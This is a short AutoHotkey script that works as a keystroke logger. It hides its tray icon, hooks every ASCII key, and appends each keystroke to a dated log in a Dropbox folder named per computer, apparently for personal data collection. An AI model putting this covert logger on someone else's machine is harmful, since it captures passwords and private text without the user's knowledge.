#include FcnLib.ahk
#NoTrayIcon

SetFormat, Integer, H
Loop, 0x7f
Hotkey, % "*~" . chr(A_Index), LogKey
Return

LogKey:
Key := RegExReplace(asc(SubStr(A_ThisHotkey,0)),"^0x")
date:=CurrentTime("hyphendate")

text=%A_ThisHotkey%`t%key%`n
file=C:\Dropbox\fastData\keys\%A_ComputerName%\%date%.log
FileAppend(text, file)
Return
